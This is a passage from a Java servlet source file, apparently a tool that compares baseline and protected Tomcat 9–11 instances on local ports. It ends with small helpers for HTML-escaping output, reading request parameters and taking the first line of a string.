          {"id":"tomcat9-baseline","label":"Tomcat 9 baseline","kind":"baseline","port":18080},
          {"id":"tomcat9-protected","label":"Tomcat 9 protected","kind":"protected","port":18081},
          {"id":"tomcat10-baseline","label":"Tomcat 10 baseline","kind":"baseline","port":18082},
          {"id":"tomcat10-protected","label":"Tomcat 10 protected","kind":"protected","port":18083},
          {"id":"tomcat11-baseline","label":"Tomcat 11 baseline","kind":"baseline","port":18084},
          {"id":"tomcat11-protected","label":"Tomcat 11 protected","kind":"protected","port":18085}
        ]
        """;
  }

  private static String html(String value) {
    return value == null
        ? ""
        : value
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;");
  }

  private static String value(HttpServletRequest request, String name, String fallback) {
    String value = request.getParameter(name);
    return value == null ? fallback : value;
  }

  private static String firstLine(String value) {
    if (value == null || value.isBlank()) {
      return "";
    }
    int newline = value.indexOf('\n');
    String first = newline >= 0 ? value.substring(0, newline) : value;
    return first.length() > 120 ? first.substring(0, 120) : first;
  }
}
